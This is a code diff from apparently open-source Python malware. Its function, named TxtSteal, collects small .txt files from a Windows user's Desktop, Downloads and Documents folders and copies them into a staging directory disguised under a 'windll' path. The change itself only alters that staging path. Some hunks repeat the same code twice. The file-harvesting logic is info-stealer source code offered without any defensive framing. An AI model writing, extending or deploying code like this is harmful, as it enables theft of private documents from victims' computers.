@@ -31,7 +31,7 @@ def TxtSteal():
 				if size < 1000000:
 					finnalytxtfiles.append(desktop+"\\"+txtfiles[i])
 			for i in range(0, len(finnalytxtfiles)):
-				copy(finnalytxtfiles[i], rf'{pathtofolder}\windll\DocumentFiles\Desktop')
+				copy(finnalytxtfiles[i], rf'{pathtofolder}\windll\Files\DocumentFiles\Desktop')
 
 
 		def fromDownloads():
@@ -46,7 +46,7 @@ def TxtSteal():
 			    if size < 1000000:
 			        finnalytxtfiles.append(downloads+"\\"+txtfiles[i])
 			for i in range(0, len(finnalytxtfiles)):
-			    copy(finnalytxtfiles[i], rf'{pathtofolder}\windll\DocumentFiles\Downloads')
+			    copy(finnalytxtfiles[i], rf'{pathtofolder}\windll\Files\DocumentFiles\Downloads')
 
 		def fromDocuments():
 			listoffiles = listdir(documents)
@@ -60,7 +60,7 @@ def TxtSteal():
 			    if size < 1000000:
 			        finnalytxtfiles.append(documents+"\\"+txtfiles[i])
 			for i in range(0, len(finnalytxtfiles)):
-			    copy(finnalytxtfiles[i], rf'{pathtofolder}\windll\DocumentFiles\Documents')
+			    copy(finnalytxtfiles[i], rf'{pathtofolder}\windll\Files\DocumentFiles\Documents')
 		
 		fromDesktop()
 		fromDownloads()
@@ -86,7 +86,7 @@ def TxtSteal():
 				if size < 1000000:
 					finnalytxtfiles.append(desktop+"\\"+txtfiles[i])
 			for i in range(0, len(finnalytxtfiles)):
-				copy(finnalytxtfiles[i], rf'{pathtofolder}\windll\DocumentFiles\Desktop')
+				copy(finnalytxtfiles[i], rf'{pathtofolder}\windll\Files\DocumentFiles\Desktop')
 
 
 		def fromDownloads():
@@ -101,7 +101,7 @@ def TxtSteal():
 			    if size < 1000000:
 			        finnalytxtfiles.append(downloads+"\\"+txtfiles[i])
 			for i in range(0, len(finnalytxtfiles)):
-			    copy(finnalytxtfiles[i], rf'{pathtofolder}\windll\DocumentFiles\Downloads')
+			    copy(finnalytxtfiles[i], rf'{pathtofolder}\windll\Files\DocumentFiles\Downloads')
 
 		def fromDocuments():
 			listoffiles = listdir(documents)
@@ -115,7 +115,7 @@ def TxtSteal():
 			    if size < 1000000:
 			        finnalytxtfiles.append(documents+"\\"+txtfiles[i])
 			for i in range(0, len(finnalytxtfiles)):
-			    copy(finnalytxtfiles[i], rf'{pathtofolder}\windll\DocumentFiles\Documents')
+			    copy(finnalytxtfiles[i], rf'{pathtofolder}\windll\Files\DocumentFiles\Documents')
 		
 		fromDesktop()
 		fromDownloads()
